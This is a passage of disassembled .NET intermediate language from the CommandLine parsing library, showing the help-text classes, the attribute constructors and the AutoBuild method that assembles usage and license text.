    IL_0065:  brtrue     IL_0076

    IL_006a:  ldarg.1
    IL_006b:  ldarg.0
    IL_006c:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line4
    IL_0071:  callvirt   instance void CommandLine.Text.HelpText::AddPreOptionsLine(string)
    IL_0076:  ldarg.0
    IL_0077:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line5
    IL_007c:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_0081:  brtrue     IL_011f

    IL_0086:  ldarg.1
    IL_0087:  ldarg.0
    IL_0088:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line5
    IL_008d:  callvirt   instance void CommandLine.Text.HelpText::AddPreOptionsLine(string)
    IL_0092:  ret

    IL_0093:  ldarg.0
    IL_0094:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line1
    IL_0099:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_009e:  brtrue     IL_00af

    IL_00a3:  ldarg.1
    IL_00a4:  ldarg.0
    IL_00a5:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line1
    IL_00aa:  callvirt   instance void CommandLine.Text.HelpText::AddPostOptionsLine(string)
    IL_00af:  ldarg.0
    IL_00b0:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line2
    IL_00b5:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_00ba:  brtrue     IL_00cb

    IL_00bf:  ldarg.1
    IL_00c0:  ldarg.0
    IL_00c1:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line2
    IL_00c6:  callvirt   instance void CommandLine.Text.HelpText::AddPostOptionsLine(string)
    IL_00cb:  ldarg.0
    IL_00cc:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line3
    IL_00d1:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_00d6:  brtrue     IL_00e7

    IL_00db:  ldarg.1
    IL_00dc:  ldarg.0
    IL_00dd:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line3
    IL_00e2:  callvirt   instance void CommandLine.Text.HelpText::AddPostOptionsLine(string)
    IL_00e7:  ldarg.0
    IL_00e8:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line4
    IL_00ed:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_00f2:  brtrue     IL_0103

    IL_00f7:  ldarg.1
    IL_00f8:  ldarg.0
    IL_00f9:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line4
    IL_00fe:  callvirt   instance void CommandLine.Text.HelpText::AddPostOptionsLine(string)
    IL_0103:  ldarg.0
    IL_0104:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line5
    IL_0109:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
    IL_010e:  brtrue     IL_011f

    IL_0113:  ldarg.1
    IL_0114:  ldarg.0
    IL_0115:  ldfld      string CommandLine.Text.MultiLineTextAttribute::_line5
    IL_011a:  callvirt   instance void CommandLine.Text.HelpText::AddPostOptionsLine(string)
    IL_011f:  ret
  } // end of method MultiLineTextAttribute::AddToHelpText

} // end of class CommandLine.Text.MultiLineTextAttribute

.class public auto ansi sealed beforefieldinit CommandLine.Text.AssemblyLicenseAttribute
       extends CommandLine.Text.MultiLineTextAttribute
{
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 01 00 00 ) 
  .custom instance void [mscorlib]System.AttributeUsageAttribute::.ctor(valuetype [mscorlib]System.AttributeTargets) = ( 01 00 01 00 00 00 01 00 54 02 09 49 6E 68 65 72   // ........T..Inher
                                                                                                                         69 74 65 64 00 )                                  // ited.
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1) cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string)
    IL_0007:  ret
  } // end of method AssemblyLicenseAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1,
                               string line2) cil managed
  {
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string,
                                                                                      string)
    IL_0008:  ret
  } // end of method AssemblyLicenseAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1,
                               string line2,
                               string line3) cil managed
  {
    // Code size       10 (0xa)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  ldarg.3
    IL_0004:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string,
                                                                                      string,
                                                                                      string)
    IL_0009:  ret
  } // end of method AssemblyLicenseAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1,
                               string line2,
                               string line3,
                               string line4) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  ldarg.3
    IL_0004:  ldarg.s    line4
    IL_0006:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string,
                                                                                      string,
                                                                                      string,
                                                                                      string)
    IL_000b:  ret
  } // end of method AssemblyLicenseAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1,
                               string line2,
                               string line3,
                               string line4,
                               string line5) cil managed
  {
    // Code size       14 (0xe)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  ldarg.3
    IL_0004:  ldarg.s    line4
    IL_0006:  ldarg.s    line5
    IL_0008:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string,
                                                                                      string,
                                                                                      string,
                                                                                      string,
                                                                                      string)
    IL_000d:  ret
  } // end of method AssemblyLicenseAttribute::.ctor

} // end of class CommandLine.Text.AssemblyLicenseAttribute

.class public auto ansi sealed beforefieldinit CommandLine.Text.AssemblyUsageAttribute
       extends CommandLine.Text.MultiLineTextAttribute
{
  .custom instance void [mscorlib]System.Runtime.InteropServices.ComVisibleAttribute::.ctor(bool) = ( 01 00 01 00 00 ) 
  .custom instance void [mscorlib]System.AttributeUsageAttribute::.ctor(valuetype [mscorlib]System.AttributeTargets) = ( 01 00 01 00 00 00 01 00 54 02 09 49 6E 68 65 72   // ........T..Inher
                                                                                                                         69 74 65 64 00 )                                  // ited.
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1) cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string)
    IL_0007:  ret
  } // end of method AssemblyUsageAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1,
                               string line2) cil managed
  {
    // Code size       9 (0x9)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string,
                                                                                      string)
    IL_0008:  ret
  } // end of method AssemblyUsageAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1,
                               string line2,
                               string line3) cil managed
  {
    // Code size       10 (0xa)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  ldarg.3
    IL_0004:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string,
                                                                                      string,
                                                                                      string)
    IL_0009:  ret
  } // end of method AssemblyUsageAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1,
                               string line2,
                               string line3,
                               string line4) cil managed
  {
    // Code size       12 (0xc)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  ldarg.3
    IL_0004:  ldarg.s    line4
    IL_0006:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string,
                                                                                      string,
                                                                                      string,
                                                                                      string)
    IL_000b:  ret
  } // end of method AssemblyUsageAttribute::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string line1,
                               string line2,
                               string line3,
                               string line4,
                               string line5) cil managed
  {
    // Code size       14 (0xe)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.1
    IL_0002:  ldarg.2
    IL_0003:  ldarg.3
    IL_0004:  ldarg.s    line4
    IL_0006:  ldarg.s    line5
    IL_0008:  call       instance void CommandLine.Text.MultiLineTextAttribute::.ctor(string,
                                                                                      string,
                                                                                      string,
                                                                                      string,
                                                                                      string)
    IL_000d:  ret
  } // end of method AssemblyUsageAttribute::.ctor

} // end of class CommandLine.Text.AssemblyUsageAttribute

.class public auto ansi sealed CommandLine.Text.HandleParsingErrorsDelegate
       extends [mscorlib]System.MulticastDelegate
{
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(object 'object',
                               native int 'method') runtime managed
  {
  } // end of method HandleParsingErrorsDelegate::.ctor

  .method public hidebysig newslot virtual 
          instance void  Invoke(class CommandLine.Text.HelpText current) runtime managed
  {
  } // end of method HandleParsingErrorsDelegate::Invoke

  .method public hidebysig newslot virtual 
          instance class [mscorlib]System.IAsyncResult 
          BeginInvoke(class CommandLine.Text.HelpText current,
                      class [mscorlib]System.AsyncCallback callback,
                      object 'object') runtime managed
  {
  } // end of method HandleParsingErrorsDelegate::BeginInvoke

  .method public hidebysig newslot virtual 
          instance void  EndInvoke(class [mscorlib]System.IAsyncResult result) runtime managed
  {
  } // end of method HandleParsingErrorsDelegate::EndInvoke

} // end of class CommandLine.Text.HandleParsingErrorsDelegate

.class public auto ansi beforefieldinit CommandLine.Text.FormatOptionHelpTextEventArgs
       extends [mscorlib]System.EventArgs
{
  .field private initonly class CommandLine.BaseOptionAttribute _option
  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(class CommandLine.BaseOptionAttribute option) cil managed
  {
    // Code size       14 (0xe)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.EventArgs::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldarg.1
    IL_0008:  stfld      class CommandLine.BaseOptionAttribute CommandLine.Text.FormatOptionHelpTextEventArgs::_option
    IL_000d:  ret
  } // end of method FormatOptionHelpTextEventArgs::.ctor

  .method public hidebysig specialname instance class CommandLine.BaseOptionAttribute 
          get_Option() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class CommandLine.BaseOptionAttribute CommandLine.Text.FormatOptionHelpTextEventArgs::_option
    IL_0006:  ret
  } // end of method FormatOptionHelpTextEventArgs::get_Option

  .property instance class CommandLine.BaseOptionAttribute
          Option()
  {
    .get instance class CommandLine.BaseOptionAttribute CommandLine.Text.FormatOptionHelpTextEventArgs::get_Option()
  } // end of property FormatOptionHelpTextEventArgs::Option
} // end of class CommandLine.Text.FormatOptionHelpTextEventArgs

.class public auto ansi beforefieldinit CommandLine.Text.HelpText
       extends [mscorlib]System.Object
{
  .class auto ansi sealed nested public MessageEnum
         extends [mscorlib]System.Enum
  {
    .field public specialname rtspecialname int16 value__
    .field public static literal valuetype CommandLine.Text.HelpText/MessageEnum ParsingErrorViolatesFormat = int16(0x0000)
    .field public static literal valuetype CommandLine.Text.HelpText/MessageEnum ParsingErrorViolatesRequired = int16(0x0001)
    .field public static literal valuetype CommandLine.Text.HelpText/MessageEnum ParsingErrorViolatesExclusiveness = int16(0x0002)
  } // end of class MessageEnum

  .field private static literal int32 _builderCapacity = int32(0x00000080)
  .field private static literal int32 _defaultMaximumLength = int32(0x00000050)
  .field private valuetype [mscorlib]System.Nullable`1<int32> _maximumDisplayWidth
  .field private string _heading
  .field private string _copyright
  .field private bool _additionalNewLineAfterOption
  .field private class [mscorlib]System.Text.StringBuilder _preOptionsHelp
  .field private class [mscorlib]System.Text.StringBuilder _optionsHelp
  .field private class [mscorlib]System.Text.StringBuilder _postOptionsHelp
  .field private class CommandLine.Text.BaseSentenceBuilder _sentenceBuilder
  .field private static initonly string _defaultRequiredWord
  .field private bool _addDashesToOption
  .field private class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> FormatOptionHelpText
  .method public hidebysig specialname instance void 
          add_FormatOptionHelpText(class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> 'value') cil managed
  {
    // Code size       41 (0x29)
    .maxstack  3
    .locals init ([0] class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> V_0,
             [1] class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> V_1,
             [2] class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> V_2)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> CommandLine.Text.HelpText::FormatOptionHelpText
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  stloc.1
    IL_0009:  ldloc.1
    IL_000a:  ldarg.1
    IL_000b:  call       class [mscorlib]System.Delegate [mscorlib]System.Delegate::Combine(class [mscorlib]System.Delegate,
                                                                                            class [mscorlib]System.Delegate)
    IL_0010:  castclass  class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs>
    IL_0015:  stloc.2
    IL_0016:  ldarg.0
    IL_0017:  ldflda     class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> CommandLine.Text.HelpText::FormatOptionHelpText
    IL_001c:  ldloc.2
    IL_001d:  ldloc.1
    IL_001e:  call       !!0 [mscorlib]System.Threading.Interlocked::CompareExchange<class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs>>(!!0&,
                                                                                                                                                                                  !!0,
                                                                                                                                                                                  !!0)
    IL_0023:  stloc.0
    IL_0024:  ldloc.0
    IL_0025:  ldloc.1
    IL_0026:  bne.un.s   IL_0007

    IL_0028:  ret
  } // end of method HelpText::add_FormatOptionHelpText

  .method public hidebysig specialname instance void 
          remove_FormatOptionHelpText(class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> 'value') cil managed
  {
    // Code size       41 (0x29)
    .maxstack  3
    .locals init ([0] class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> V_0,
             [1] class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> V_1,
             [2] class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> V_2)
    IL_0000:  ldarg.0
    IL_0001:  ldfld      class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> CommandLine.Text.HelpText::FormatOptionHelpText
    IL_0006:  stloc.0
    IL_0007:  ldloc.0
    IL_0008:  stloc.1
    IL_0009:  ldloc.1
    IL_000a:  ldarg.1
    IL_000b:  call       class [mscorlib]System.Delegate [mscorlib]System.Delegate::Remove(class [mscorlib]System.Delegate,
                                                                                           class [mscorlib]System.Delegate)
    IL_0010:  castclass  class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs>
    IL_0015:  stloc.2
    IL_0016:  ldarg.0
    IL_0017:  ldflda     class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs> CommandLine.Text.HelpText::FormatOptionHelpText
    IL_001c:  ldloc.2
    IL_001d:  ldloc.1
    IL_001e:  call       !!0 [mscorlib]System.Threading.Interlocked::CompareExchange<class [mscorlib]System.EventHandler`1<class CommandLine.Text.FormatOptionHelpTextEventArgs>>(!!0&,
                                                                                                                                                                                  !!0,
                                                                                                                                                                                  !!0)
    IL_0023:  stloc.0
    IL_0024:  ldloc.0
    IL_0025:  ldloc.1
    IL_0026:  bne.un.s   IL_0007

    IL_0028:  ret
  } // end of method HelpText::remove_FormatOptionHelpText

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       50 (0x32)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ldarg.0
    IL_0007:  ldc.i4     0x80
    IL_000c:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor(int32)
    IL_0011:  stfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_preOptionsHelp
    IL_0016:  ldarg.0
    IL_0017:  ldc.i4     0x80
    IL_001c:  newobj     instance void [mscorlib]System.Text.StringBuilder::.ctor(int32)
    IL_0021:  stfld      class [mscorlib]System.Text.StringBuilder CommandLine.Text.HelpText::_postOptionsHelp
    IL_0026:  ldarg.0
    IL_0027:  call       class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.BaseSentenceBuilder::CreateBuiltIn()
    IL_002c:  stfld      class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.HelpText::_sentenceBuilder
    IL_0031:  ret
  } // end of method HelpText::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(class CommandLine.Text.BaseSentenceBuilder sentenceBuilder) cil managed
  {
    // Code size       25 (0x19)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void CommandLine.Text.HelpText::.ctor()
    IL_0006:  ldarg.1
    IL_0007:  ldstr      "sentenceBuilder"
    IL_000c:  call       void CommandLine.Assumes::NotNull<class CommandLine.Text.BaseSentenceBuilder>(!!0,
                                                                                                       string)
    IL_0011:  ldarg.0
    IL_0012:  ldarg.1
    IL_0013:  stfld      class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.HelpText::_sentenceBuilder
    IL_0018:  ret
  } // end of method HelpText::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string heading) cil managed
  {
    // Code size       25 (0x19)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void CommandLine.Text.HelpText::.ctor()
    IL_0006:  ldarg.1
    IL_0007:  ldstr      "heading"
    IL_000c:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_0011:  ldarg.0
    IL_0012:  ldarg.1
    IL_0013:  stfld      string CommandLine.Text.HelpText::_heading
    IL_0018:  ret
  } // end of method HelpText::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(class CommandLine.Text.BaseSentenceBuilder sentenceBuilder,
                               string heading) cil managed
  {
    // Code size       26 (0x1a)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.2
    IL_0002:  call       instance void CommandLine.Text.HelpText::.ctor(string)
    IL_0007:  ldarg.1
    IL_0008:  ldstr      "sentenceBuilder"
    IL_000d:  call       void CommandLine.Assumes::NotNull<class CommandLine.Text.BaseSentenceBuilder>(!!0,
                                                                                                       string)
    IL_0012:  ldarg.0
    IL_0013:  ldarg.1
    IL_0014:  stfld      class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.HelpText::_sentenceBuilder
    IL_0019:  ret
  } // end of method HelpText::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string heading,
                               string copyright) cil managed
  {
    // Code size       43 (0x2b)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void CommandLine.Text.HelpText::.ctor()
    IL_0006:  ldarg.1
    IL_0007:  ldstr      "heading"
    IL_000c:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_0011:  ldarg.2
    IL_0012:  ldstr      "copyright"
    IL_0017:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_001c:  ldarg.0
    IL_001d:  ldarg.1
    IL_001e:  stfld      string CommandLine.Text.HelpText::_heading
    IL_0023:  ldarg.0
    IL_0024:  ldarg.2
    IL_0025:  stfld      string CommandLine.Text.HelpText::_copyright
    IL_002a:  ret
  } // end of method HelpText::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(class CommandLine.Text.BaseSentenceBuilder sentenceBuilder,
                               string heading,
                               string copyright) cil managed
  {
    // Code size       27 (0x1b)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.2
    IL_0002:  ldarg.3
    IL_0003:  call       instance void CommandLine.Text.HelpText::.ctor(string,
                                                                        string)
    IL_0008:  ldarg.1
    IL_0009:  ldstr      "sentenceBuilder"
    IL_000e:  call       void CommandLine.Assumes::NotNull<class CommandLine.Text.BaseSentenceBuilder>(!!0,
                                                                                                       string)
    IL_0013:  ldarg.0
    IL_0014:  ldarg.1
    IL_0015:  stfld      class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.HelpText::_sentenceBuilder
    IL_001a:  ret
  } // end of method HelpText::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(string heading,
                               string copyright,
                               object options) cil managed
  {
    // Code size       61 (0x3d)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void CommandLine.Text.HelpText::.ctor()
    IL_0006:  ldarg.1
    IL_0007:  ldstr      "heading"
    IL_000c:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_0011:  ldarg.2
    IL_0012:  ldstr      "copyright"
    IL_0017:  call       void CommandLine.Assumes::NotNullOrEmpty(string,
                                                                  string)
    IL_001c:  ldarg.3
    IL_001d:  ldstr      "options"
    IL_0022:  call       void CommandLine.Assumes::NotNull<object>(!!0,
                                                                   string)
    IL_0027:  ldarg.0
    IL_0028:  ldarg.1
    IL_0029:  stfld      string CommandLine.Text.HelpText::_heading
    IL_002e:  ldarg.0
    IL_002f:  ldarg.2
    IL_0030:  stfld      string CommandLine.Text.HelpText::_copyright
    IL_0035:  ldarg.0
    IL_0036:  ldarg.3
    IL_0037:  call       instance void CommandLine.Text.HelpText::AddOptions(object)
    IL_003c:  ret
  } // end of method HelpText::.ctor

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor(class CommandLine.Text.BaseSentenceBuilder sentenceBuilder,
                               string heading,
                               string copyright,
                               object options) cil managed
  {
    // Code size       29 (0x1d)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldarg.2
    IL_0002:  ldarg.3
    IL_0003:  ldarg.s    options
    IL_0005:  call       instance void CommandLine.Text.HelpText::.ctor(string,
                                                                        string,
                                                                        object)
    IL_000a:  ldarg.1
    IL_000b:  ldstr      "sentenceBuilder"
    IL_0010:  call       void CommandLine.Assumes::NotNull<class CommandLine.Text.BaseSentenceBuilder>(!!0,
                                                                                                       string)
    IL_0015:  ldarg.0
    IL_0016:  ldarg.1
    IL_0017:  stfld      class CommandLine.Text.BaseSentenceBuilder CommandLine.Text.HelpText::_sentenceBuilder
    IL_001c:  ret
  } // end of method HelpText::.ctor

  .method public hidebysig static class CommandLine.Text.HelpText 
          AutoBuild(object options) cil managed
  {
    // Code size       8 (0x8)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  ldnull
    IL_0002:  call       class CommandLine.Text.HelpText CommandLine.Text.HelpText::AutoBuild(object,
                                                                                              class CommandLine.Text.HandleParsingErrorsDelegate)
    IL_0007:  ret
  } // end of method HelpText::AutoBuild

  .method public hidebysig static class CommandLine.Text.HelpText 
          AutoBuild(object options,
                    class CommandLine.Text.HandleParsingErrorsDelegate errDelegate) cil managed
  {
    // Code size       225 (0xe1)
    .maxstack  19
    .locals init ([0] class [mscorlib]System.Reflection.AssemblyTitleAttribute V_0,
             [1] class [mscorlib]System.Reflection.AssemblyInformationalVersionAttribute V_1,
             [2] class [mscorlib]System.Reflection.AssemblyCopyrightAttribute V_2,
             [3] class CommandLine.Text.HelpText V_3,
             [4] class CommandLine.Text.HelpText V_4,
             [5] class CommandLine.CommandLineOptionsBase V_5,
             [6] class CommandLine.Text.AssemblyLicenseAttribute V_6,
             [7] class CommandLine.Text.AssemblyUsageAttribute V_7)
    IL_0000:  call       !!0 CommandLine.ReflectionUtil::GetAttribute<class [mscorlib]System.Reflection.AssemblyTitleAttribute>()
    IL_0005:  stloc.0
    IL_0006:  ldloc.0
    IL_0007:  brtrue     IL_0017

    IL_000c:  ldstr      "HelpText::AutoBuild() requires that you define Ass"
    + "emblyTitleAttribute."
    IL_0011:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor(string)
    IL_0016:  throw

    IL_0017:  call       !!0 CommandLine.ReflectionUtil::GetAttribute<class [mscorlib]System.Reflection.AssemblyInformationalVersionAttribute>()
    IL_001c:  stloc.1
    IL_001d:  ldloc.1
    IL_001e:  brtrue     IL_002e

    IL_0023:  ldstr      "HelpText::AutoBuild() requires that you define Ass"
    + "emblyInformationalVersionAttribute."
    IL_0028:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor(string)
    IL_002d:  throw

    IL_002e:  call       !!0 CommandLine.ReflectionUtil::GetAttribute<class [mscorlib]System.Reflection.AssemblyCopyrightAttribute>()
    IL_0033:  stloc.2
    IL_0034:  ldloc.2
    IL_0035:  brtrue     IL_0045

    IL_003a:  ldstr      "HelpText::AutoBuild() requires that you define Ass"
    + "emblyCopyrightAttribute."
    IL_003f:  newobj     instance void [mscorlib]System.InvalidOperationException::.ctor(string)
    IL_0044:  throw

    IL_0045:  newobj     instance void CommandLine.Text.HelpText::.ctor()
    IL_004a:  stloc.3
    IL_004b:  ldloc.3
    IL_004c:  ldloc.0
    IL_004d:  callvirt   instance string [mscorlib]System.Reflection.AssemblyTitleAttribute::get_Title()
    IL_0052:  call       string [mscorlib]System.IO.Path::GetFileNameWithoutExtension(string)
    IL_0057:  ldloc.1
    IL_0058:  callvirt   instance string [mscorlib]System.Reflection.AssemblyInformationalVersionAttribute::get_InformationalVersion()
    IL_005d:  newobj     instance void CommandLine.Text.HeadingInfo::.ctor(string,
                                                                           string)
    IL_0062:  call       string CommandLine.Text.HeadingInfo::op_Implicit(class CommandLine.Text.HeadingInfo)
    IL_0067:  callvirt   instance void CommandLine.Text.HelpText::set_Heading(string)
    IL_006c:  ldloc.3
    IL_006d:  ldloc.2
    IL_006e:  callvirt   instance string [mscorlib]System.Reflection.AssemblyCopyrightAttribute::get_Copyright()
    IL_0073:  callvirt   instance void CommandLine.Text.HelpText::set_Copyright(string)
    IL_0078:  ldloc.3
    IL_0079:  ldc.i4.1
    IL_007a:  callvirt   instance void CommandLine.Text.HelpText::set_AdditionalNewLineAfterOption(bool)
    IL_007f:  ldloc.3
    IL_0080:  ldc.i4.1
    IL_0081:  callvirt   instance void CommandLine.Text.HelpText::set_AddDashesToOption(bool)
    IL_0086:  ldloc.3
    IL_0087:  stloc.s    V_4
    IL_0089:  ldarg.1
    IL_008a:  brfalse    IL_00a6

    IL_008f:  ldarg.0
    IL_0090:  isinst     CommandLine.CommandLineOptionsBase
    IL_0095:  stloc.s    V_5
    IL_0097:  ldloc.s    V_5
    IL_0099:  brfalse    IL_00a6

    IL_009e:  ldarg.1
    IL_009f:  ldloc.s    V_4
    IL_00a1:  callvirt   instance void CommandLine.Text.HandleParsingErrorsDelegate::Invoke(class CommandLine.Text.HelpText)
    IL_00a6:  call       !!0 CommandLine.ReflectionUtil::GetAttribute<class CommandLine.Text.AssemblyLicenseAttribute>()
    IL_00ab:  stloc.s    V_6
    IL_00ad:  ldloc.s    V_6
    IL_00af:  brfalse    IL_00be

    IL_00b4:  ldloc.s    V_6
    IL_00b6:  ldloc.s    V_4
    IL_00b8:  ldc.i4.1
    IL_00b9:  callvirt   instance void CommandLine.Text.MultiLineTextAttribute::AddToHelpText(class CommandLine.Text.HelpText,
                                                                                              bool)
    IL_00be:  call       !!0 CommandLine.ReflectionUtil::GetAttribute<class CommandLine.Text.AssemblyUsageAttribute>()
    IL_00c3:  stloc.s    V_7
    IL_00c5:  ldloc.s    V_7
    IL_00c7:  brfalse    IL_00d6

    IL_00cc:  ldloc.s    V_7
    IL_00ce:  ldloc.s    V_4
    IL_00d0:  ldc.i4.1
    IL_00d1:  callvirt   instance void CommandLine.Text.MultiLineTextAttribute::AddToHelpText(class CommandLine.Text.HelpText,
                                                                                              bool)
    IL_00d6:  ldloc.s    V_4
    IL_00d8:  ldarg.0
    IL_00d9:  callvirt   instance void CommandLine.Text.HelpText::AddOptions(object)
    IL_00de:  ldloc.s    V_4
    IL_00e0:  ret
  } // end of method HelpText::AutoBuild

  .method public hidebysig static void  DefaultParsingErrorsHandler(class CommandLine.CommandLineOptionsBase options,
                                                                    class CommandLine.Text.HelpText current) cil managed
  {
    // Code size       139 (0x8b)
    .maxstack  16
    .locals init ([0] string V_0,
             [1] string[] V_1,
             [2] string[] V_2,
             [3] string[] V_3,
             [4] int32 V_4,
             [5] string V_5)
    IL_0000:  ldarg.0
    IL_0001:  callvirt   instance class CommandLine.PostParsingState CommandLine.CommandLineOptionsBase::get_InternalLastPostParsingState()
    IL_0006:  callvirt   instance class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError> CommandLine.PostParsingState::get_Errors()
    IL_000b:  callvirt   instance int32 class [mscorlib]System.Collections.Generic.List`1<class CommandLine.ParsingError>::get_Count()
    IL_0010:  ldc.i4.0
    IL_0011:  ble        IL_008a

    IL_0016:  ldarg.1
    IL_0017:  ldarg.0
    IL_0018:  ldc.i4.2
    IL_0019:  callvirt   instance string CommandLine.Text.HelpText::RenderParsingErrorsText(class CommandLine.CommandLineOptionsBase,
                                                                                            int32)
    IL_001e:  stloc.0
    IL_001f:  ldloc.0
    IL_0020:  call       bool [mscorlib]System.String::IsNullOrEmpty(string)
